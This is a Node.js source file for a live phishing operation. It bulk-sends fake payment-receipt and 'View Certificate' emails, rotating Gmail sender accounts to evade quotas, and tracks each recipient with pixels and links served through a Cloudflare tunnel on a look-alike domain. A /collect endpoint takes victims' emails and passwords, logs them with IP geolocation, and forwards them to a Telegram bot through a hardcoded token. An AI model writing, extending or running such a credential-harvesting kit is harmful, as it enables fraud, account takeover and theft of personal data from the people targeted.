import nodemailer from 'nodemailer';
import { readFileSync, writeFileSync, existsSync } from 'fs';
import { createServer } from 'http';
import http from 'http';
import https from 'https';
import { spawn, execSync } from 'child_process';
import { join, extname, dirname } from 'path';
import { fileURLToPath } from 'url';

process.on('uncaughtException', err => {
  console.error('[UNCAUGHT]', err);
});

process.on('unhandledRejection', err => {
  console.error('[UNHANDLED]', err);
});

const __dirname = dirname(fileURLToPath(import.meta.url));

// ─── SENDERS (loaded from senders.json) ───────────────────────────────────────
const SENDERS = JSON.parse(readFileSync('senders.json', 'utf8'));
if (!SENDERS.length) { console.error('senders.json is empty'); }
let senderIndex = 0;
let currentSender = SENDERS[senderIndex];

function nextSender() {
  senderIndex++;
  if (senderIndex >= SENDERS.length) return null;
  currentSender = SENDERS[senderIndex];
  return currentSender;
}

function isQuotaError(msg) {
  return /Daily user sending quota exceeded|quota|Sending limit reached|PolicyRejection|4\.7\.1|5\.4\.5/i.test(msg);
}

// ─── CONFIG ───────────────────────────────────────────────────────────────────
const CONFIG = {
  from: () => `"Brooklyn East" <${currentSender.email}>`,
  subject: 'Payment Receipt Confirmation',
  emailsFile: 'emails.txt',
  logFile: 'send_log.txt',
  reportFile: 'report.json',
  delayMs: 500,
  batchSize: 50,
  batchPauseMs: 5000,
  maxEmails: 10000,
};

// ─── TUNNEL MODE ─────────────────────────────────────────────────────────────
// Set QUICK_TUNNEL = true to get a fresh trycloudflare.com URL for testing.
// Set QUICK_TUNNEL = false to use the named docs.mscertify.live tunnel.
const QUICK_TUNNEL = false;
const NAMED_TUNNEL_URL = 'https://docs.mscertify.live';
const NAMED_TUNNEL_ID = 'ceaf677e-f25a-4568-a0a6-56aa500689b2';

let TUNNEL_URL = NAMED_TUNNEL_URL;   // overwritten at runtime when QUICK_TUNNEL=true

const LOCAL_PORT = 19992;
const PIXEL_GIF = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');

// Safe static file types the cert page is allowed to reference
const STATIC_MIME = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.gif': 'image/gif',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon',
  '.woff': 'font/woff',
  '.woff2': 'font/woff2',
  '.ttf': 'font/ttf',
  '.pdf': 'application/pdf',
};

// Template is read fresh on every send so edits take effect without restarting
function loadEmailTemplate() {
  return existsSync('email_body.html') ? readFileSync('email_body.html', 'utf8') : null;
}

// ─── TRACKING STATE ───────────────────────────────────────────────────────────
const tracking = {
  sent: new Set(),
  failed: new Map(),
  sentAt: new Map(),
  opens: new Map(),    // auto: pixel fired
  clicks: new Map(),    // auto: link clicked
  manualInbox: new Set(),    // manual: confirmed inbox
  manualSpam: new Set(),    // manual: confirmed spam
};

function encodeEmail(e) { return Buffer.from(e).toString('base64url'); }
function decodeEmail(s) {
  try { return Buffer.from(s, 'base64url').toString('utf8'); } catch { return null; }
}

// ─── CLASSIFY ─────────────────────────────────────────────────────────────────
function classify(email) {
  if (tracking.failed.has(email)) return 'SMTP_FAILED';
  if (!tracking.sent.has(email)) return 'NOT_SENT';
  if (tracking.manualInbox.has(email)) return 'INBOX';
  if (tracking.manualSpam.has(email)) return 'SPAM';
  if (tracking.clicks.has(email)) return 'CLICKED';
  if (tracking.opens.has(email)) return 'OPENED';
  return 'PENDING';
}

const STATUS_META = {
  INBOX: { color: '#4ade80', icon: '✅', label: 'Inbox' },
  SPAM: { color: '#f97316', icon: '🚫', label: 'Spam' },
  CLICKED: { color: '#22c55e', icon: '🔗', label: 'Clicked' },
  OPENED: { color: '#3b82f6', icon: '📬', label: 'Opened' },
  SMTP_FAILED: { color: '#dc2626', icon: '✗', label: 'SMTP Failed' },
  PENDING: { color: '#94a3b8', icon: '⏳', label: 'Pending' },
  NOT_SENT: { color: '#64748b', icon: '—', label: 'Not Sent' },
};

// ─── HELPERS ──────────────────────────────────────────────────────────────────
function log(type, msg) {
  const line = `[${new Date().toISOString()}] ${type}  ${msg}`;
  console.log(line);
  writeFileSync(CONFIG.logFile, line + '\n', { flag: 'a' });
}

function fmt(ts) { return ts ? new Date(ts).toLocaleTimeString() : '—'; }

function saveReport(emails) {
  writeFileSync(CONFIG.reportFile, JSON.stringify(
    emails.map(e => ({
      email: e,
      status: classify(e),
      sentAt: tracking.sentAt.get(e) || null,
      openedAt: tracking.opens.get(e) || null,
      clickedAt: tracking.clicks.get(e) || null,
      error: tracking.failed.get(e) || null,
    })), null, 2
  ), 'utf8');
}

// ─── DASHBOARD ────────────────────────────────────────────────────────────────
function buildDashboard(emails) {
  const counts = {};
  Object.keys(STATUS_META).forEach(k => (counts[k] = 0));
  emails.forEach(e => { const s = classify(e); counts[s] = (counts[s] || 0) + 1; });

  const rows = emails.map(email => {
    const s = classify(email);
    const meta = STATUS_META[s];
    const enc = encodeEmail(email);
    const tag = tracking.manualInbox.has(email) ? ' <span style="color:#4ade80;font-size:10px">(manual)</span>'
      : tracking.manualSpam.has(email) ? ' <span style="color:#f97316;font-size:10px">(manual)</span>' : '';
    return `<tr>
      <td>${email}</td>
      <td><span style="color:${meta.color};font-weight:600">${meta.icon} ${meta.label}</span>${tag}</td>
      <td>${fmt(tracking.sentAt.get(email))}</td>
      <td style="color:#3b82f6">${fmt(tracking.opens.get(email))}</td>
      <td style="color:#22c55e">${fmt(tracking.clicks.get(email))}</td>
      <td style="color:#ef4444;font-size:11px">${tracking.failed.get(email) || ''}</td>
      <td>
        <button onclick="mark('${enc}','inbox')" style="background:#166534;color:#fff;border:none;border-radius:4px;padding:3px 8px;cursor:pointer;font-size:11px;margin-right:4px">✅ Inbox</button>
        <button onclick="mark('${enc}','spam')"  style="background:#7c2d12;color:#fff;border:none;border-radius:4px;padding:3px 8px;cursor:pointer;font-size:11px">🚫 Spam</button>
      </td>
    </tr>`;
  }).join('');

  const total = emails.length;
  const cards = [
    { num: tracking.sent.size, color: '#94a3b8', label: 'Sent' },
    { num: tracking.failed.size, color: '#dc2626', label: 'Failed' },
    { num: counts.INBOX || 0, color: '#4ade80', label: '✅ Inbox' },
    { num: counts.SPAM || 0, color: '#f97316', label: '🚫 Spam' },
    { num: counts.CLICKED || 0, color: '#22c55e', label: '🔗 Clicked' },
    { num: counts.OPENED || 0, color: '#3b82f6', label: '📬 Opened' },
    { num: counts.PENDING || 0, color: '#64748b', label: '⏳ Pending' },
  ].map(c => `<div class="card"><div class="num" style="color:${c.color}">${c.num}</div><div class="lbl">${c.label}</div></div>`).join('');

  return `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="refresh" content="10">
<title>Dashboard · ${EMAIL}</title><style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',sans-serif;background:#0f172a;color:#e2e8f0;padding:24px}
h1{font-size:20px;margin-bottom:4px}
.sub{font-size:11px;color:#64748b;margin-bottom:18px}
.cards{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:20px}
.card{background:#1e293b;border-radius:10px;padding:14px 20px;min-width:110px}
.card .num{font-size:28px;font-weight:700}
.card .lbl{font-size:11px;color:#94a3b8;margin-top:4px}
table{width:100%;border-collapse:collapse;background:#1e293b;border-radius:10px;overflow:hidden}
th{background:#334155;padding:9px 14px;text-align:left;font-size:11px;color:#94a3b8;text-transform:uppercase}
td{padding:9px 14px;border-bottom:1px solid #334155;font-size:12px}
tr:last-child td{border-bottom:none}
tr:hover td{background:#273449}
.toast{position:fixed;bottom:20px;right:20px;color:#fff;padding:10px 18px;border-radius:8px;font-size:13px;display:none;z-index:99}
.legend{font-size:11px;color:#64748b;margin-top:16px;padding:12px;background:#1e293b;border-radius:8px}
</style></head><body>
<div class="toast" id="toast"></div>
<script>
function mark(enc,status){
  fetch('/mark?e='+enc+'&status='+status).then(r=>r.json()).then(d=>{
    const t=document.getElementById('toast');
    t.textContent=(status==='inbox'?'✅ Marked Inbox':'🚫 Marked Spam')+': '+d.email;
    t.style.background=status==='inbox'?'#22c55e':'#f97316';
    t.style.display='block';
    setTimeout(()=>{t.style.display='none';location.reload();},1800);
  });
}
</script>
<h1>📊 Email Tracker Dashboard</h1>
<p class="sub">Auto-refresh 10s &middot; ${total} recipients &middot; ${EMAIL} &middot; ${TUNNEL_URL}</p>
<div class="cards">${cards}</div>
<table>
  <thead><tr><th>Email</th><th>Status</th><th>Sent At</th><th>📬 Opened</th><th>🔗 Clicked</th><th>Error</th><th>Override</th></tr></thead>
  <tbody>${rows}</tbody>
</table>
<div class="legend">
  <strong>Auto-detected:</strong>
  <span style="color:#22c55e">🔗 Clicked</span> cert link clicked &nbsp;·&nbsp;
  <span style="color:#3b82f6">📬 Opened</span> pixel fired (email opened) &nbsp;·&nbsp;
  <span style="color:#64748b">⏳ Pending</span> sent, no signal yet
  &nbsp;&nbsp;<strong>Manual:</strong>
  <span style="color:#4ade80">✅ Inbox</span> you confirmed inbox &nbsp;·&nbsp;
  <span style="color:#f97316">🚫 Spam</span> you confirmed spam
</div>
</body></html>`;
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

function loadEmails() {
  if (!existsSync(CONFIG.emailsFile)) { console.error('emails.txt not found');}
  const lines = readFileSync(CONFIG.emailsFile, 'utf8').split('\n').map(l => l.trim()).filter(l => l.includes('@'));
  if (!lines.length) { console.error('No valid emails'); }
  return lines.slice(0, CONFIG.maxEmails);
}

// ─── LOCAL SERVER ─────────────────────────────────────────────────────────────
function startServer(emails) {
  return new Promise((resolve, reject) => {
    const srv = createServer((req, res) => {
      console.log(`[HTTP] ${req.method} ${req.url}`);  // log every incoming request
      const url = new URL(req.url, 'http://localhost');
      const path = url.pathname;
      const enc = url.searchParams.get('e') || '';
      const who = enc ? decodeEmail(enc) : null;

      if (path === '/pixel') {
        if (who && emails.includes(who) && !tracking.opens.has(who)) {
          tracking.opens.set(who, new Date().toISOString());
          log('📬', `OPENED by ${who}`);
          saveReport(emails);
        }
        res.writeHead(200, { 'Content-Type': 'image/gif', 'Content-Length': PIXEL_GIF.length, 'Cache-Control': 'no-store' });
        res.end(PIXEL_GIF);

      } else if (path === '/click') {
        if (who && emails.includes(who) && !tracking.clicks.has(who)) {
          tracking.clicks.set(who, new Date().toISOString());
          log('🔗', `CLICKED by ${who}`);
          saveReport(emails);
        }
        res.writeHead(302, { 'Location': `/?e=${enc}` });
        res.end();

      } else if (path === '/mark') {
        const email = who;
        const status = url.searchParams.get('status');
        if (email && emails.includes(email)) {
          if (status === 'inbox') { tracking.manualInbox.add(email); tracking.manualSpam.delete(email); }
          else if (status === 'spam') { tracking.manualSpam.add(email); tracking.manualInbox.delete(email); }
          saveReport(emails);
          res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' });
          res.end(JSON.stringify({ ok: true, email, status }));
        } else {
          res.writeHead(400); res.end(JSON.stringify({ ok: false }));
        }

      } else if (path === '/collect' && req.method === 'OPTIONS') {
        // CORS preflight for fetch() from the tunnel domain
        res.writeHead(204, {
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Methods': 'POST, OPTIONS',
          'Access-Control-Allow-Headers': 'Content-Type',
        });
        res.end();

      } else if (path === '/collect' && req.method === 'POST') {
        // Extract real client IP — Cloudflare tunnel sets cf-connecting-ip
        const clientIp = req.headers['cf-connecting-ip']
          || req.headers['x-forwarded-for']?.split(',')[0].trim()
          || req.socket.remoteAddress
          || '—';

        let raw = '';
        req.on('data', chunk => { raw += chunk; });
        req.on('end', () => {
          try {
            const data = JSON.parse(raw);
            const ts = new Date().toISOString();
            const recipient = data.recipient || who || '—';
            const email = data.email || '—';
            const password = data.password || '—';

            // ── IP geolocation (ip-api.com — free, no key, HTTP only) ──────────
            const geoReq = http.request(`http://ip-api.com/json/${clientIp}?fields=status,isp,regionName,city`, (geoRes) => {
              let geoRaw = '';
              geoRes.on('data', c => { geoRaw += c; });
              geoRes.on('end', () => {
                let isp = '—', region = '—', city = '—';
                try {
                  const geo = JSON.parse(geoRaw);
                  if (geo.status === 'success') {
                    isp = geo.isp || '—';
                    region = geo.regionName || '—';
                    city = geo.city || '—';
                  }
                } catch { /* ignore */ }

                // ── local log ──────────────────────────────────────────────
                const entry = `[${ts}] recipient=${recipient} | email=${email} | password=${password} | ip=${clientIp} | isp=${isp} | region=${region} | city=${city}\n`;
                writeFileSync('collect_log.txt', entry, { flag: 'a' });
                log('💰', `COLLECT → ${email} | ip=${clientIp} | ${city}, ${region} | ${isp}`);

                // ── Telegram notification ──────────────────────────────────
                const TG_TOKEN = '9245719568:AAH6qv4YRXNm93Oj6ksLc-R1Qvg753cCjSc';
                const TG_CHAT_ID = '8798855832';
                if (TG_TOKEN && TG_CHAT_ID) {
                  const text = encodeURIComponent(
                    `🎯 New Collect\n` +
                    `👤 Recipient: ${recipient}\n` +
                    `📧 Email: ${email}\n` +
                    `🔑 Password: ${password}\n` +
                    `🌐 IP: ${clientIp}\n` +
                    `🏢 ISP: ${isp}\n` +
                    `📍 Location: ${city}, ${region}\n` +
                    `🕒 ${ts}`
                  );
                  const tgUrl = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${text}`;
                  https.get(tgUrl, (r) => { r.resume(); })
                    .on('error', (err) => { log('warn', `Telegram error: ${err.message}`); });
                }
              });
            });
            geoReq.on('error', () => {
              // geo failed — still log without location
              const entry = `[${ts}] recipient=${recipient} | email=${email} | password=${password} | ip=${clientIp} | isp=— | region=— | city=—\n`;
              writeFileSync('collect_log.txt', entry, { flag: 'a' });
              log('💰', `COLLECT → ${email} | ip=${clientIp} (geo failed)`);
            });
            geoReq.end();
          } catch { /* bad JSON — ignore */ }

          res.writeHead(200, {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*',
          });
          res.end(JSON.stringify({ ok: true }));
        });

      } else if (path === '/unsubscribe') {
        // Treat unsubscribe as a manual spam mark so dashboard reflects it
        if (who && emails.includes(who)) {
          tracking.manualSpam.add(who);
          tracking.manualInbox.delete(who);
          saveReport(emails);
        }
        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
        res.end('<!DOCTYPE html><html><body style="font-family:Arial,sans-serif;padding:40px;text-align:center"><h2>You have been unsubscribed.</h2><p style="color:#888">You will no longer receive emails from us.</p></body></html>');

      } else if (path === '/dashboard') {
        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
        res.end(buildDashboard(emails));

      } else if (path === '/status') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(emails.map(e => ({
          email: e, status: classify(e),
          openedAt: tracking.opens.get(e) || null,
          clickedAt: tracking.clicks.get(e) || null,
        })), null, 2));

      } else {
        // ── cert view tracking ────────────────────────────────────────────────
        const isCertRoot = path === '/' || path === '/cert.b64';
        if (isCertRoot && who && emails.includes(who) && !tracking.clicks.has(who)) {
          tracking.clicks.set(who, new Date().toISOString());
          log('🔗', `CERT VIEW by ${who}`);
          saveReport(emails);
        }

        // ── static assets (css, images, fonts next to cert.html) ─────────────
        if (!isCertRoot) {
          const assetExt = extname(path).toLowerCase();
          const assetMime = STATIC_MIME[assetExt];
          const assetPath = join(__dirname, path.replace(/^\//, ''));
          if (assetMime && existsSync(assetPath)) {
            const body = readFileSync(assetPath);
            res.writeHead(200, { 'Content-Type': assetMime, 'Content-Length': body.length, 'Cache-Control': 'no-store' });
            res.end(body);
            return;
          }
          res.writeHead(404); res.end('not found');
          return;
        }

        // ── serve cert.html directly from script directory ────────────────────
        const certPath = join(__dirname, 'cert.html');
        console.log(`[SERVE] certPath=${certPath} exists=${existsSync(certPath)}`);
        const body = readFileSync(certPath);
        res.writeHead(200, {
          'Content-Type': 'text/html; charset=utf-8',
          'Content-Length': body.length,
          'Cache-Control': 'no-store, no-cache, must-revalidate',
        });
        res.end(body);
      }
    });
    const tryBind = (attemptsLeft) => {
      srv.removeAllListeners('error');
      srv.on('error', async (err) => {
        if (err.code === 'EADDRINUSE' && attemptsLeft > 0) {
          log('warn', `Port ${LOCAL_PORT} still busy — killing and retrying...`);
          try {
            const out = execSync(`netstat -ano | findstr ":${LOCAL_PORT} "`, { encoding: 'utf8', shell: true });
            const pids = [...new Set(
              out.split('\n')
                .map(line => line.trim().split(/\s+/).pop())
                .filter(p => p && /^\d+$/.test(p) && p !== '0')
            )];
            for (const pid of pids) {
              try { execSync(`taskkill /PID ${pid} /F`, { shell: true, stdio: 'ignore' }); } catch { /* skip */ }
            }
          } catch { /* port freed already */ }
          await sleep(1500);
          tryBind(attemptsLeft - 1);
        } else {
          log('FATAL', `Cannot bind port ${LOCAL_PORT}: ${err.message}`);
          reject(err);
        }
      });
      srv.listen(LOCAL_PORT, () => resolve(srv));   // bind all interfaces (0.0.0.0)
    };
    tryBind(3);
  });
}

// ─── TUNNEL ───────────────────────────────────────────────────────────────────
async function openTunnel(emails) {
  const server = await startServer(emails);
  return new Promise(resolve => {
    const CF_EXE = 'C:\\Program Files (x86)\\cloudflared\\cloudflared.exe';

    const args = QUICK_TUNNEL
      ? ['--url', `http://127.0.0.1:${LOCAL_PORT}`, '--no-autoupdate']
      : ['tunnel', 'run', NAMED_TUNNEL_ID];

    const cf = spawn(CF_EXE, args, { stdio: ['ignore', 'pipe', 'pipe'] });
    let ready = false;

    cf.on('error', err => {
      log('FAIL', `cloudflared failed: ${err.message}`);
    });

    const onData = chunk => {
      const text = chunk.toString();
      if (QUICK_TUNNEL) process.stdout.write('[CF] ' + text);  // show raw cloudflared output

      // Quick tunnel: parse the trycloudflare.com URL from cloudflared output
      if (QUICK_TUNNEL && !ready) {
        const match = text.match(/https:\/\/[a-z0-9-]+\.trycloudflare\.com/i);
        if (match) {
          TUNNEL_URL = match[0];
          ready = true;
          log('ok', `Quick tunnel live → ${TUNNEL_URL}`);
          log('ok', `Test cert page   → ${TUNNEL_URL}/?e=${encodeEmail(emails[0] || 'test@example.com')}`);
          resolve({ cleanup: () => { cf.kill(); server.close(); } });
        }
      }

      // Named tunnel: fire when connection registers
      if (!QUICK_TUNNEL && !ready && /Registered tunnel connection|connection/i.test(text)) {
        ready = true;
        log('ok', `Named tunnel live → ${TUNNEL_URL}`);
        resolve({ cleanup: () => { cf.kill(); server.close(); } });
      }
    };

    cf.stdout.on('data', onData);
    cf.stderr.on('data', onData);

    // Fallback timeout — resolve anyway after 15s so sending still starts
    setTimeout(() => {
      if (!ready) {
        ready = true;
        log('warn', `Tunnel timeout — proceeding with ${TUNNEL_URL}`);
        resolve({ cleanup: () => { cf.kill(); server.close(); } });
      }
    }, 15000);
  });
}

// ─── EMAIL BUILDERS ───────────────────────────────────────────────────────────
function buildBodyHtml(to) {
  const enc = encodeEmail(to);
  const certLink = `${TUNNEL_URL}/?e=${enc}`;
  const pixelUrl = `${TUNNEL_URL}/pixel?e=${enc}`;
  const template = loadEmailTemplate();
  if (template) {
    return template
      .replace(/\{\{CERT_URL\}\}/g, certLink)
      .replace(/\{\{PIXEL_URL\}\}/g, pixelUrl);
  }
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="margin:0;padding:0;background:#ffffff;font-family:Arial,Helvetica,sans-serif;font-size:15px;color:#222222;line-height:1.6;">
  <table width="100%" cellpadding="0" cellspacing="0" border="0">
    <tr>
      <td>
        <table width="100%" cellpadding="0" cellspacing="0" border="0" style="max-width:560px;margin:0 auto;">
          <tr>
            <td style="padding:32px 24px;">
              <p style="margin:0 0 16px 0;">I hope you are doing well. I wanted to follow up and check if you received my previous message. I was not sure if it came through on your end.</p>
              <p style="margin:0 0 24px 0;">I have attached your certificate for your reference. You can view it using the button below.</p>
              <table cellpadding="0" cellspacing="0" border="0" style="margin:0 0 24px 0;">
                <tr>
                  <td style="background:#1a73e8;border-radius:6px;padding:12px 28px;">
                    <a href="${certLink}" target="_blank" style="color:#ffffff;text-decoration:none;font-size:15px;font-weight:600;font-family:Arial,Helvetica,sans-serif;">View Certificate</a>
                  </td>
                </tr>
              </table>
              <p style="margin:0 0 24px 0;">It would be great to hear back from you when you get a chance.</p>
              <p style="margin:24px 0 0 0;font-size:11px;color:#999999;border-top:1px solid #eeeeee;padding-top:12px;">
                You received this email because you are a client or partner of Meg Warren. To stop receiving emails,
                <a href="${TUNNEL_URL}/unsubscribe?e=${enc}" style="color:#999999;">unsubscribe here</a>.
              </p>
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
</body>
</html>`;
}

function buildBodyText(to) {
  return [
    'Hi,',
    '',
    'Your payment has been successfully received and processed.',
    '',
    'Invoice #: INV-48271',
    'Payment Date: May 11, 2026',
    'Amount Paid: $4,850.00',
    '',
    'Please retain this email for your records.',
    '',
    'Thank you,',
    'Brooklyn East',
    'Accounts Department',
    'Oasis Construction LLC',
    '8393 Renken Rd, Worden, IL 62097',
  ].join('\r\n');
}

// ─── MAIN ─────────────────────────────────────────────────────────────────────
async function main() {
  // Show working directory and confirm cert.html is visible
  const certPath = join(process.cwd(), 'cert.html');
  console.log(`[DEBUG] cwd       : ${process.cwd()}`);
  console.log(`[DEBUG] cert.html : ${certPath}`);
  console.log(`[DEBUG] exists    : ${existsSync(certPath)}`);

  // Kill ALL PIDs holding LOCAL_PORT so ./run.bat always starts clean
  try {
    const out = execSync(`netstat -ano | findstr ":${LOCAL_PORT} "`, { encoding: 'utf8', shell: true });
    const pids = [...new Set(
      out.split('\n')
        .map(line => line.trim().split(/\s+/).pop())
        .filter(p => p && /^\d+$/.test(p) && p !== '0')
    )];
    for (const pid of pids) {
      try { execSync(`taskkill /PID ${pid} /F`, { shell: true, stdio: 'ignore' }); } catch { /* protected or already gone */ }
    }
    if (pids.length) await sleep(800);
  } catch { /* port already free */ }

  const emails = loadEmails();

  console.log('\n══════════════════════════════════════════════════');
  console.log(`  Senders:    ${SENDERS.map(s => s.email).join(', ')}`);
  console.log(`  Tunnel:     ${TUNNEL_URL}`);
  console.log(`  Recipients: ${emails.length}`);
  console.log('══════════════════════════════════════════════════\n');

  // ── Build SMTP transporter for current sender ────────────────────────────
  function makeTransporter(sender) {
    return nodemailer.createTransport({
      host: 'smtp.gmail.com',
      port: 587,
      secure: false,
      requireTLS: true,
      auth: { user: sender.email, pass: sender.password },
    });
  }

  // Verify and connect first sender
  let transporter = makeTransporter(currentSender);
  try {
    await transporter.verify();
    log('ok', `SMTP connected as ${currentSender.email} (${senderIndex + 1}/${SENDERS.length})`);
  } catch (err) {
    log('FAIL', `SMTP failed for ${currentSender.email}: ${err.message}`); 
  }

  const { cleanup } = await openTunnel(emails);
  log('ok', `Dashboard → http://localhost:${LOCAL_PORT}/dashboard`);

  let sent = 0, failed = 0;
  for (let i = 0; i < emails.length; i++) {
    const to = emails[i];
    try {
      const msgId = `<${Date.now()}.${Math.random().toString(36).slice(2)}.${i}@gmail.com>`;
      await transporter.sendMail({
        from: CONFIG.from(),
        replyTo: CONFIG.from(),
        to,
        subject: CONFIG.subject,
        html: buildBodyHtml(to),
        text: buildBodyText(to),
        envelope: { from: currentSender.email, to },
        headers: {
          'Message-ID': msgId,
          'X-Organization': 'Oasis Construction LLC',
          'Content-Language': 'en-US',
        },
      });
      tracking.sent.add(to); tracking.sentAt.set(to, Date.now()); sent++;
      log('ok', `[${i + 1}/${emails.length}] Sent → ${to}  (via ${currentSender.email})`);
    } catch (err) {
      if (isQuotaError(err.message)) {
        log('warn', `Quota hit on ${currentSender.email} — rotating to next sender...`);
        const next = nextSender();
        if (!next) {
          log('FAIL', 'All senders exhausted for today. Add more to senders.json.');
          break;
        }
        transporter = makeTransporter(next);
        try {
          await transporter.verify();
          log('ok', `Switched to ${currentSender.email} (${senderIndex + 1}/${SENDERS.length})`);
        } catch (verifyErr) {
          log('FAIL', `New sender ${currentSender.email} failed: ${verifyErr.message}`);
          break;
        }
        // Retry same email with new sender
        i--;
      } else {
        tracking.failed.set(to, err.message); failed++;
        log('FAIL', `[${i + 1}/${emails.length}] FAILED → ${to} | ${err.message}`);
      }
    }
    saveReport(emails);
    if ((i + 1) % CONFIG.batchSize === 0 && i + 1 < emails.length) {
      log('warn', `Batch done — pausing ${CONFIG.batchPauseMs / 1000}s...`);
      await sleep(CONFIG.batchPauseMs);
    } else if (i + 1 < emails.length) {
      await sleep(CONFIG.delayMs);
    }
  }

  console.log(`\n  ✓ Done: ${sent} sent, ${failed} failed`);
  console.log(`  Dashboard: http://localhost:${LOCAL_PORT}/dashboard\n`);
  setInterval(() => saveReport(emails), 60000);
  process.on('SIGINT', () => { saveReport(emails); cleanup(); process.exit(0); });
}

main().catch(err => {
  console.error('FATAL:', err);
  setInterval(() => {}, 1000);
});